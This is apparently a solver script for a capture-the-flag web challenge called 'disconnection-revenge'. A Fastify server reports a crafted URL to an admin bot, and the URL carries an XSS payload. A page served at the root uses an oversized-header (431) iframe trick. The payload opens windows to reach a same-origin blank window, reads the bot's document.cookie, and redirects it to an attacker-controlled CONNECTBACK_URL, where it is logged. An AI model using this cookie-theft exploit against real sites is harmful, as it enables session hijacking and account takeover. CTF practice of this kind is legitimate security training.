const app = require("fastify")();

const fail = (message) => {
  console.error(message);
  return process.exit(1);
};

const BOT_BASE_URL = process.env.BOT_BASE_URL ?? "http://localhost:1337";
const CONNECTBACK_URL = process.env.CONNECTBACK_URL ?? fail("No URL");
const PORT = "8080";

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const reportUrl = (url) =>
  fetch(`${BOT_BASE_URL}/api/report`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({ url }),
  }).then((r) => r.text());

const html = `
<body>
  <script>
    const ifr = document.createElement("iframe");
    ifr.src = "http://disconnection-revenge:3000/cookie?" + "x".repeat(20000); // 431 (Request Header Fields Too Large)
    document.body.appendChild(ifr);
  </script>
</body>
`.trim();
app.get("/", (req, reply) => reply.type("text/html").send(html));

const xss = `
  const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

  (async () => {
    const win1 = open("${CONNECTBACK_URL}");
    while (true) {
      if (win1[0]) break;
      await sleep(500);
    }

    const win2 = win1[0].open("about:blank");
    while (true) {
      if (win2?.document?.cookie) break;
      await sleep(500);
    }

    location = "${CONNECTBACK_URL}/flag?" + win2.document.cookie;
  })();
`.trim();

app.get("/flag", async (req, reply) => {
  // You got a flag!
  console.log({ ...req.query });
  process.exit(0);
});

app.listen({ port: PORT, host: "0.0.0.0" }, async (err) => {
  if (err) fail(err.toString());

  await sleep(3 * 1000);
  await reportUrl(
    `http://disconnection-revenge:3000/?xss=${encodeURIComponent(xss)}`
  );

  await sleep(5 * 1000);
  fail("Failed");
});
